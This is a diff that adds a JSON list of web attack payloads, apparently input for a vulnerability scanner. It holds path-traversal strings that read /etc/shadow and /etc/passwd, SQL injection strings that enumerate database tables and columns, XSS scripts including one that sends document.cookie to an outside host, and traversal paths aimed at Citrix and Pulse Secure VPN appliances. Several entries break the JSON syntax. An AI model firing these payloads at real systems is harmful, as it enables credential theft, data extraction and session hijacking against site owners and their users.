@@ -1,0 +1,30 @@
+[
+    "/../../../../etc/shadow",
+    "?file=/etc/passwd",
+    "/../../../../../../../../../etc/passwd",
+    "?id=' or '1'='1",
+    "robots.txt",
+    "?id=2 and 1=1",
+    "?id=1' waitfor delay '00:00:10'--",
+    "?title=1' ORDER BY 99-- -",
+    "?title=1' union select 1,2,3,4,5,6,7-- -",
+    "?title=1' union select 1,@@version,3,4,5,6,7-- -",
+    "?title=1' union select 1,table_name,3,4,5,6,7 from information_schema.tables-- -",
+    "?title=1' union select 1,column_name,3,4,5,6,7 from information_schema.columns-- -",
+    "?title=1' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="users"-- -"
+    "?firstname=foo&lastname=bar<script>alert(\"echo\")</script>",
+    "foo<script>alert(document.cookie)</script>",
+    "?firstname=sean&lastname
+    =<script>alert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))</script>",
+    "?firstname=carter&lastname=<script>window.location=\"http://www.google.com.com\";</script>",
+    "<script>window.location=\"http://vulnweb.com?cookie=\"+document.cookie;</script>",
+    "/../vpns/",
+    "/vpns/cfg/smb.conf",
+    "/vpns/portal/scripts/newbm.pl",
+    "vpns/portal/scripts/rmbm.pl",
+    "/vpns/portal/scripts/picktheme.pl",
+    "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
+    "/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/"
+
+    
+]
